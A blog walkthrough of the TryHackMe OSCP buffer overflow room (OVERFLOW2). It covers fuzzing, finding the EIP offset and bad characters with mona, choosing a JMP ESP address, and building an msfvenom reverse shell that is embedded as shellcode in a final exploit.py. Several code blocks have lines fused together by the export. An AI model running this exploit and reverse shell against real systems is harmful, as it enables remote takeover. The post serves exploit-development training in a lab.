::: {}
# TryHackMe: OSCP Buffer Overflow Prep (OVERFLOW 2) {#tryhackme-oscp-buffer-overflow-prep-overflow-2 .p-name}
:::

::: {.section .p-summary field="subtitle"}
Practice Stack Based Buffer Overflows! for OSCP
:::

:::::::: {.section .e-content field="body"}
::::::: {#249a .section .section .section--body .section--first .section--last}
::: section-divider

------------------------------------------------------------------------
:::

::::: section-content
:::: {.section-inner .sectionLayout--insetColumn}
### TryHackMe: OSCP Buffer Overflow Prep (OVERFLOW 2) {#6e0d .graf .graf--h3 .graf--leading .graf--title name="6e0d"}

<figure id="1692" class="graf graf--figure graf-after--h3">
<img
src="https://cdn-images-1.medium.com/max/800/1*7LY5hEw-I2Qo0xo_Brskhg.png"
class="graf-image" data-image-id="1*7LY5hEw-I2Qo0xo_Brskhg.png"
data-width="2240" data-height="1260" data-is-featured="true" />
</figure>

**Practice Stack Based Buffer Overflows! for OSCP**

**Room link:**
[**https://www.tryhackme.com/room/bufferoverflowprep**](https://www.tryhackme.com/room/bufferoverflowprep){.markup--anchor
.markup--p-anchor
data-href="https://www.tryhackme.com/room/bufferoverflowprep"
rel="noopener ugc nofollow noopener" target="_blank"}

### Definitions: {#93a7 .graf .graf--h3 .graf-after--p name="93a7"}

1.  [**EIP =\>**The Extended Instruction Pointer (EIP) is a register
    that contains the address of the next instruction for the program or
    command.]{#317e}
2.  [**ESP=\>**The Extended Stack Pointer (ESP) is a register that lets
    you know where on the stack you are and allows you to push data in
    and out of the application.]{#fc4a}
3.  [**JMP =\>**The Jump (JMP) is an instruction that modifies the flow
    of execution where the operand you designate will contain the
    address being jumped to.]{#1ae4}
4.  [**\\x41, \\x42, \\x43 =\>**The hexadecimal values for A, B and C.
    For this exercise, there is no benefit to using hex vs ascii, it's
    just my personal preference.]{#e0d5}

### OVERFLOW #2 {#3fde .graf .graf--h3 .graf-after--li name="3fde"}

Okay, right now we should run our Immunity Debugger as Administrator and
open the oscp.exe.

<figure id="75ac" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*Z7-FKyJgjmoII5H4.png"
class="graf-image" data-image-id="0*Z7-FKyJgjmoII5H4.png"
data-width="653" data-height="391" />
</figure>

The application will be loaded into the debugger in the "Paused" state.
click Red play button on the upper bar **OR F9** within Immunity
Debugger.

Ensure the exe is running by checking the status in the lower right of
Immunity Debugger.

<figure id="5ca3" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*UWAmMOu3Dqit92Yh.png"
class="graf-image" data-image-id="0*UWAmMOu3Dqit92Yh.png"
data-width="310" data-height="215" />
</figure>

To check we can NC to target machine with port 1337.

<figure id="39dd" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*7ZDMPvhgjW6o6MbB.png"
class="graf-image" data-image-id="0*7ZDMPvhgjW6o6MbB.png"
data-width="511" data-height="438" />
</figure>

Here i am choose **OVERFLOW2** Parameter

Set the working folder within mona.

::: {#6998 .graf .graf--mixtapeEmbed .graf-after--p}
[**GitHub - corelan/mona: Corelan Repository for mona.py**\
*Corelan Repository for mona.py. Contribute to corelan/mona development
by creating an account on
GitHub.*github.com](https://github.com/corelan/mona?source=post_page-----57c22b51a91f-------------------------------- "https://github.com/corelan/mona?source=post_page-----57c22b51a91f--------------------------------"){.markup--anchor
.markup--mixtapeEmbed-anchor
data-href="https://github.com/corelan/mona?source=post_page-----57c22b51a91f--------------------------------"}[](https://github.com/corelan/mona?source=post_page-----57c22b51a91f--------------------------------){.js-mixtapeImage
.mixtapeImage .u-ignoreBlock media-id="98914da47e205468d402599577046571"
thumbnail-img-id="0*jAUydU4kbdpYoJcK"
style="background-image: url(https://cdn-images-1.medium.com/fit/c/160/160/0*jAUydU4kbdpYoJcK);"}
:::

Download mona.py and paset into C:\\Program Files (x86)\\Immunity
Inc\\Immunity Debugger\\PyCommands

``` {#e026 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
!mona config -set workingfolder c:\mona\%p
```

<figure id="982d" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*b8pQtgVssdrBypXD.png"
class="graf-image" data-image-id="0*b8pQtgVssdrBypXD.png"
data-width="419" data-height="185" />
</figure>

Let's try to run fuzzer.py (get from the room) and see the results. Just
check whether the IP inside the script is correct and make sure to run
again the oscp.exe in Immunity Debugger before running the script.

**Note:- change the Command OVERFLOW1 to OVERFLOW2 in fuzzer.py and
exploit.py**

### Fuzzer.py {#2138 .graf .graf--h3 .graf-after--p name="2138"}

``` {#1cd1 .graf .graf--pre .graf-after--h3 .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="lua"}
import socket, time, sys
ip = "192.168.43.57";
port = 1337
timeout = 5
buffer = []
counter = 100
while len(buffer) < 30:
    buffer.append("A" * counter)
    counter += 100
for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        s.recv(1024)
        print("Fuzzing with %s bytes" % len(string))
        s.send("OVERFLOW2 " + string + "\r\n")
        s.recv(1024)
        s.close()
    except:
        print("Could not connect to " + ip + ":" + str(port))
        sys.exit(0)
    time.sleep(1)
```

Also copy the **exploit.py** code

``` {#07ac .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="makefile"}
import socketip = "192.168.43.57"
port = 1337prefix = "OVERFLOW2 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""buffer = prefix + overflow + retn + padding + payload + postfixs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

Click on Red play button , and Kick off the fuzzer.py against the target
IP

<figure id="c844" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*OJ1d6tOFotzic1Ji.png"
class="graf-image" data-image-id="0*OJ1d6tOFotzic1Ji.png"
data-width="427" data-height="254" />
</figure>

If you can see it stop at 700 bytes which means the offset would be in
the range of 600 to 700 bytes. Let's create a pattern more than our
offset around 300 bytes which would be 1000 bytes.

<figure id="df31" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*CWEOfezsxeMn2VLI.png"
class="graf-image" data-image-id="0*CWEOfezsxeMn2VLI.png"
data-width="674" data-height="311" />
</figure>

above image you can see that EIP has been overwritten with 41414141
(AAAA). So we need to find the exact address where the program is
crashed

Now generate a pattern, based on the length of bytes to crash the
server.

``` {#f4c5 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="yaml"}
msf-pattern_create -l 1000
```

<figure id="81d7" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*LJqpbqItQNgNks4R.png"
class="graf-image" data-image-id="0*LJqpbqItQNgNks4R.png"
data-width="814" data-height="285" />
</figure>

So copy the payload and put it into the payload variable in exploit.py
and try to run it. The script should crash the oscp.exe server again.

**CTRL+F2 = Reload OSCP.exe**

**F9 = Run Server**

<figure id="c0e9" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*1RGLJlpK5T1D2--5.png"
class="graf-image" data-image-id="0*1RGLJlpK5T1D2--5.png"
data-width="806" data-height="426" />
</figure>

Ensure oscp.exe is running within Immunity Debugger. Execute exploit.py
against the target.

<figure id="2636" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*CseUbPMsAFLhEJ33.png"
class="graf-image" data-image-id="0*CseUbPMsAFLhEJ33.png"
data-width="406" data-height="96" />
</figure>

<figure id="6017" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*2p9-kPL9Je9ZQEx9.png"
class="graf-image" data-image-id="0*2p9-kPL9Je9ZQEx9.png"
data-width="671" data-height="303" />
</figure>

in the above image We have **EIP=76413176**

EIP is overwritten by an offset that we generated.

### Find Offset Value {#ee43 .graf .graf--h3 .graf-after--p name="ee43"}

<figure id="c134" class="graf graf--figure graf-after--h3">
<img
src="https://cdn-images-1.medium.com/max/800/0*0SpS3jdDCYiSd4rZ.png"
class="graf-image" data-image-id="0*0SpS3jdDCYiSd4rZ.png"
data-width="419" data-height="77" />
</figure>

offset value is 634

**Another Method** to find Offset value using mona module

Try running the following mona command in immunity:

``` {#b010 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="yaml"}
!mona findmsp -distance 1000
```

<figure id="7e54" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*OW8eF85mGLMY4W9t.png"
class="graf-image" data-image-id="0*OW8eF85mGLMY4W9t.png"
data-width="562" data-height="354" />
</figure>

So look for the line said EIP contains normal pattern :0x76413176
(offset 634). the offset we found in the offset variable and set the
retn variable to BBBB.

Update the offset and the retn variable

<figure id="5ecd" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*OddCqs2TgzAnCik0.png"
class="graf-image" data-image-id="0*OddCqs2TgzAnCik0.png"
data-width="713" data-height="319" />
</figure>

Restart the .exe in Immunity Debugger with Ctrl+F12 and F9 to run.
Execute the exploit.py. If the offset is correct we should see
"42424242" \<- the B's at the EIP.

Let's run it again.

<figure id="963e" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*BG6l8oBYeIw8mKX9.png"
class="graf-image" data-image-id="0*BG6l8oBYeIw8mKX9.png"
data-width="406" data-height="96" />
</figure>

<figure id="7b34" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*8_-UBCe0RDEa006R.png"
class="graf-image" data-image-id="0*8_-UBCe0RDEa006R.png"
data-width="672" data-height="299" />
</figure>

As we can see the **EIP** Register is Overwritten with BBBB or 42424242.
So far everything went well.

Take note of the ESP address because we will be using the values in this
position in future step

### Find Badchars {#a8fb .graf .graf--h3 .graf-after--p name="a8fb"}

Now we need to find the BADCHARS- For which we create BADCHARS, on set
inside the machine using MONA and another by just googling or using a
python script.By default \\x00 is considered as a BADCHAR so it is to be
neglected for sure. This helps us to identify the characters which are
really BAD for our program!

Generate a bytearray using mona, and exclude the null byte (\\x00) by
default.

Use this mona commands.

``` {#ec49 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="python"}
!mona bytearray -b "\x00"
```

<figure id="9a2e" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*1nKFBMbCFzq3roIk.png"
class="graf-image" data-image-id="0*1nKFBMbCFzq3roIk.png"
data-width="875" data-height="247" />
</figure>

Now we need to generate a string of bad chars from \\x01 to \\xff that
is identical to the bytearray. Use the python script

### bytegen.py {#5726 .graf .graf--h3 .graf-after--p name="5726"}

``` {#36a6 .graf .graf--pre .graf-after--h3 .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="scss"}
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

<figure id="88b5" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*Od-8aVoQy3uoIihB.png"
class="graf-image" data-image-id="0*Od-8aVoQy3uoIihB.png"
data-width="815" data-height="289" />
</figure>

This generated string has already removed the \\x00 so we need to remove
that from the .bin with mona.

Copy the new generated string into the payload variable in the
exploit.py

<figure id="ab27" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*kdOU6gsLlvp1XqCm.png"
class="graf-image" data-image-id="0*kdOU6gsLlvp1XqCm.png"
data-width="806" data-height="317" />
</figure>

Run the script and take note of the address to which the ESP register
points

<figure id="f1e2" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*SojMRXspzJS2HI7W.png"
class="graf-image" data-image-id="0*SojMRXspzJS2HI7W.png"
data-width="406" data-height="96" />
</figure>

<figure id="ae14" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*7Hy4AfordZTQ9tYP.png"
class="graf-image" data-image-id="0*7Hy4AfordZTQ9tYP.png"
data-width="669" data-height="306" />
</figure>

Right click on ESP Value and Follow in dump

<figure id="e78b" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*ry_FsxVcDrIjw49k.png"
class="graf-image" data-image-id="0*ry_FsxVcDrIjw49k.png"
data-width="394" data-height="370" />
</figure>

in the above image the sequence has been changed between 22 or 25 that
means there are some badchar in over payload lets find out badchars

Use it in the following mona command

**Note:-** Maybe your ESP address is diffrent

``` {#d346 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="python"}
!mona compare -f C:\mona\oscp\bytearray.bin -a 00DAFA28
```

<figure id="13ff" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*h6dNXG78Vah7FkaW.png"
class="graf-image" data-image-id="0*h6dNXG78Vah7FkaW.png"
data-width="875" data-height="256" />
</figure>

Possible bad chars

So we found a list of possible bad chars
**`23 24 3c 3d 83 84 ba bb`{.markup--code .markup--p-code}**

Not all of these might be bad chars! Sometimes bad chars cause the next
byte to get corrupted as well, or even affect the rest of the string.

At this point I start removing the bad characters one at a time. I
removed one bad character at a time by repeating the following steps:

- [Remove character from byte array]{#ab09}
- [Remove character from exploit payload]{#cbf2}
- [Start exe]{#4d9c}
- [Compare using mona]{#9aa6}

Start oscp.exe in immunity,

So i created a new bytearray and removed \\x23 from the payload too

``` {#fd55 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="python"}
!mona bytearray -b "\x00\x23"
```

<figure id="86f0" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*fnL6d3UlfyqpspyF.png"
class="graf-image" data-image-id="0*fnL6d3UlfyqpspyF.png"
data-width="684" data-height="366" />
</figure>

run server

Edit exploit.py remove \\x23 from payload variable and run exploit.py

<figure id="45a6" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*SblpplCnbGGx79DB.png"
class="graf-image" data-image-id="0*SblpplCnbGGx79DB.png"
data-width="406" data-height="96" />
</figure>

check ESP Pointer value

<figure id="521e" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*z63CM2hdSGAgwHxi.png"
class="graf-image" data-image-id="0*z63CM2hdSGAgwHxi.png"
data-width="675" data-height="307" />
</figure>

``` {#9d5d .graf .graf--pre .graf-after--figure .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="python"}
!mona compare -f C:\mona\oscp\bytearray.bin -a 009AFA28(ESP)
```

<figure id="beb4" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*QZ8aKEfJ_JDMxDhc.png"
class="graf-image" data-image-id="0*QZ8aKEfJ_JDMxDhc.png"
data-width="606" data-height="298" />
</figure>

As a hint by the immunity debugger the possible BADCHARS now were x3c
\\x3d \\x83 \\x84\\xba\\xbb. That means a BADCHAR made its adjacent byte
too a BADCHAR which want BAD by default

start oscp.exe in immunity

So i created a new bytearray and removed \\x3c from the payload too

``` {#df77 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="python"}
!mona bytearray -b "\x00\x23\x3c"
```

run server

Edit exploit.py remove \\x3c from payload variable and run exploit.py

<figure id="7891" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*YJTh40hQu4o8h0_m.png"
class="graf-image" data-image-id="0*YJTh40hQu4o8h0_m.png"
data-width="406" data-height="96" />
</figure>

check ESP Pointer value

<figure id="9ec2" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*M_M7IwHWqRYXsVZj.png"
class="graf-image" data-image-id="0*M_M7IwHWqRYXsVZj.png"
data-width="675" data-height="313" />
</figure>

``` {#f3c0 .graf .graf--pre .graf-after--figure .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="python"}
!mona compare -f C:\mona\oscp\bytearray.bin -a 0077FA28
```

<figure id="7c24" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*3KPyOoe30ov8Xxjb.png"
class="graf-image" data-image-id="0*3KPyOoe30ov8Xxjb.png"
data-width="637" data-height="271" />
</figure>

and again it was the same case x3c was a BADCHAR was x3d wasn't one.

Now we had only two apparent BADCHARS \\x83 \\x84\\xba\\xbb

start oscp.exe in immunity

So i created a new bytearray and removed \\x83 from the payload too

``` {#6009 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="python"}
!mona bytearray -b "\x00\x23\x3c\x83"
```

run server

Edit exploit.py remove \\x83 from payload variable and run exploit.py

<figure id="bc79" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*dlGesLIz7-QUifEd.png"
class="graf-image" data-image-id="0*dlGesLIz7-QUifEd.png"
data-width="406" data-height="96" />
</figure>

check ESP Pointer value

<figure id="0b0f" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*V4wAfFDVzEO1PFer.png"
class="graf-image" data-image-id="0*V4wAfFDVzEO1PFer.png"
data-width="672" data-height="305" />
</figure>

``` {#0495 .graf .graf--pre .graf-after--figure .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="python"}
!mona compare -f C:\mona\oscp\bytearray.bin -a 007FFA28
```

<figure id="6cf9" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*_IA6uJB2guwNpDsK.png"
class="graf-image" data-image-id="0*_IA6uJB2guwNpDsK.png"
data-width="575" data-height="257" />
</figure>

and again it was the same case x83 was a BADCHAR was x84 wasn't one.

Now we had only two apparent BADCHARS \\xba\\xbb

start oscp.exe in immunity

So i created a new bytearray and removed \\xba from the payload too

``` {#0dda .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="python"}
!mona bytearray -b "\x00\x23\x3c\x83\xba"
```

run server

Edit exploit.py remove \\xba from payload variable and run exploit.py

<figure id="f2d4" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*kwmIUqiCtLzudl_u.png"
class="graf-image" data-image-id="0*kwmIUqiCtLzudl_u.png"
data-width="406" data-height="96" />
</figure>

check ESP Pointer value

<figure id="fc8c" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*VAA7Ig8loVy7e0nd.png"
class="graf-image" data-image-id="0*VAA7Ig8loVy7e0nd.png"
data-width="668" data-height="304" />
</figure>

``` {#4bbe .graf .graf--pre .graf-after--figure .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="python"}
!mona compare -f C:\mona\oscp\bytearray.bin -a 00A4FA28
```

<figure id="cb02" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*CdYKJ1wAtyUz92Is.png"
class="graf-image" data-image-id="0*CdYKJ1wAtyUz92Is.png"
data-width="875" data-height="327" />
</figure>

After this! WE FIRE IT and run the comparison in MONA, we find the
address unmodified now. BOOM so finally we got our BADCHARS

got error unmodified

And after try and error, the sequence is like this.

Green Box means correct bad chars

Let's find the jump point using the mona command again:

``` {#8a54 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="diff"}
!mona jmp -r esp -cpb “\x00\x23\x3c\x83\xba”
```

<figure id="8d97" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*i_x5a4uvmbnvUSPo.png"
class="graf-image" data-image-id="0*i_x5a4uvmbnvUSPo.png"
data-width="617" data-height="254" />
</figure>

Any of the addresses from the results above may be used as the retn
value in the exploit. Little endian = Reverse. Also add padding to allow
the payload to unpack.

Note the address **625011AF**

> ***Note:- If 625011AF not create perfect paylaod for for reverse shell
> then change address untill you got reverse shell***

Update our retn variable with the new address and must be written
backward (since the system is little-endian=Reverse).

``` {#99b8 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="ini"}
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 16
```

<figure id="71bc" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*RExc5euU_QAqo_kq.png"
class="graf-image" data-image-id="0*RExc5euU_QAqo_kq.png"
data-width="509" data-height="213" />
</figure>

Now generate the reverse shell payload using msfvenom.

``` {#e2af .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.43.73 LPORT=4444 EXITFUNC=thread -b “\x00\x23\x3c\x83\xba” -f c
```

<figure id="1e27" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*wIfK3TxoolLx1DXh.png"
class="graf-image" data-image-id="0*wIfK3TxoolLx1DXh.png"
data-width="835" data-height="539" />
</figure>

Copy the payload into the exploit.py and set the payload variable equal
to buf.

<figure id="68ea" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*p63TG6bh7exNAV01.png"
class="graf-image" data-image-id="0*p63TG6bh7exNAV01.png"
data-width="875" data-height="445" />
</figure>

so the final payload is this for My Kali

``` {#4670 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="makefile"}
import socketip = "192.168.43.57"
port = 1337
buf = b""
buf += b"\xfc\xbb\x20\xd6\x6b\x2a\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
buf += b"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\xdc\x3e\xe9\x2a\x1c"
buf += b"\xbf\x8e\xa3\xf9\x8e\x8e\xd0\x8a\xa1\x3e\x92\xde\x4d\xb4\xf6"
buf += b"\xca\xc6\xb8\xde\xfd\x6f\x76\x39\x30\x6f\x2b\x79\x53\xf3\x36"
buf += b"\xae\xb3\xca\xf8\xa3\xb2\x0b\xe4\x4e\xe6\xc4\x62\xfc\x16\x60"
buf += b"\x3e\x3d\x9d\x3a\xae\x45\x42\x8a\xd1\x64\xd5\x80\x8b\xa6\xd4"
buf += b"\x45\xa0\xee\xce\x8a\x8d\xb9\x65\x78\x79\x38\xaf\xb0\x82\x97"
buf += b"\x8e\x7c\x71\xe9\xd7\xbb\x6a\x9c\x21\xb8\x17\xa7\xf6\xc2\xc3"
buf += b"\x22\xec\x65\x87\x95\xc8\x94\x44\x43\x9b\x9b\x21\x07\xc3\xbf"
buf += b"\xb4\xc4\x78\xbb\x3d\xeb\xae\x4d\x05\xc8\x6a\x15\xdd\x71\x2b"
buf += b"\xf3\xb0\x8e\x2b\x5c\x6c\x2b\x20\x71\x79\x46\x6b\x1e\x4e\x6b"
buf += b"\x93\xde\xd8\xfc\xe0\xec\x47\x57\x6e\x5d\x0f\x71\x69\xa2\x3a"
buf += b"\xc5\xe5\x5d\xc5\x36\x2c\x9a\x91\x66\x46\x0b\x9a\xec\x96\xb4"
buf += b"\x4f\xa2\xc6\x1a\x20\x03\xb6\xda\x90\xeb\xdc\xd4\xcf\x0c\xdf"
buf += b"\x3e\x78\xa6\x1a\xa9\x47\x9f\x0f\x60\x20\xe2\x4f\x63\xec\x6b"
buf += b"\xa9\xe9\x1c\x3a\x62\x86\x85\x67\xf8\x37\x49\xb2\x85\x78\xc1"
buf += b"\x31\x7a\x36\x22\x3f\x68\xaf\xc2\x0a\xd2\x66\xdc\xa0\x7a\xe4"
buf += b"\x4f\x2f\x7a\x63\x6c\xf8\x2d\x24\x42\xf1\xbb\xd8\xfd\xab\xd9"
buf += b"\x20\x9b\x94\x59\xff\x58\x1a\x60\x72\xe4\x38\x72\x4a\xe5\x04"
buf += b"\x26\x02\xb0\xd2\x90\xe4\x6a\x95\x4a\xbf\xc1\x7f\x1a\x46\x2a"
buf += b"\x40\x5c\x47\x67\x36\x80\xf6\xde\x0f\xbf\x37\xb7\x87\xb8\x25"
buf += b"\x27\x67\x13\xee\x47\x8a\xb1\x1b\xe0\x13\x50\xa6\x6d\xa4\x8f"
buf += b"\xe5\x8b\x27\x25\x96\x6f\x37\x4c\x93\x34\xff\xbd\xe9\x25\x6a"
buf += b"\xc1\x5e\x45\xbf\xc1\x60\xb9\x40"
prefix = "OVERFLOW2 "
offset = 634
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 16
payload = bufpostfix = ""buffer = prefix + overflow + retn + padding + payload + postfixs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(buffer + "\r\n")
  print("Done!")
except:
  print("Could not connect.")
```

Start up a listener with netcat

<figure id="c19b" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*8InNYZYS1AgBJLT6.png"
class="graf-image" data-image-id="0*8InNYZYS1AgBJLT6.png"
data-width="333" data-height="101" />
</figure>

Start the vulnerable application again. Execute exploit.py. Now looking
back at netcat.

<figure id="3f19" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*5XBNdXMZLnjUSyXY.png"
class="graf-image" data-image-id="0*5XBNdXMZLnjUSyXY.png"
data-width="406" data-height="96" />
</figure>

<figure id="c99a" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*4fZ5HvK9LKlunwgA.png"
class="graf-image" data-image-id="0*4fZ5HvK9LKlunwgA.png"
data-width="657" data-height="246" />
</figure>

### Promote and Collaborate on Cybersecurity Insights {#4d9f .graf .graf--h3 .graf-after--figure name="4d9f"}

We are excited to offer promotional opportunities and guest post
collaborations on our blog and website, focusing on all aspects of
cybersecurity. Whether you're an expert with valuable insights to share
or a business looking to reach a wider audience, our platform provides
the perfect space to showcase your knowledge and services. Let's work
together to enhance our community's understanding of cybersecurity!

### About the Author: {#057d .graf .graf--h3 .graf-after--p name="057d"}

[Vijay
Gupta](https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2){.markup--anchor
.markup--p-anchor
data-href="https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2"
rel="noopener" target="_blank"} is a cybersecurity enthusiast with
several years of experience in cyber security, [cyber crime forensics
investigation](https://play.google.com/store/books/details?id=VRz7EAAAQBAJ){.markup--anchor
.markup--p-anchor
data-href="https://play.google.com/store/books/details?id=VRz7EAAAQBAJ"
rel="noopener ugc nofollow noopener" target="_blank"}, and security
awareness training in schools and colleges. With a passion for
safeguarding digital environments and educating others about
cybersecurity best practices, Vijay has dedicated his career to
promoting cyber safety and resilience. Stay connected with Vijay Gupta
on various social media platforms and professional networks to access
valuable insights and stay updated on the latest cybersecurity trends.
::::
:::::
:::::::
::::::::

By [Vijay Kumar Gupta](https://medium.com/@bevijaygupta){.p-author
.h-card} on [August 15, 2024](https://medium.com/p/0dd01ea94cbd).

[Canonical
link](https://medium.com/@bevijaygupta/tryhackme-oscp-buffer-overflow-prep-overflow-2-0dd01ea94cbd){.p-canonical}

Exported from [Medium](https://medium.com) on February 9, 2026.
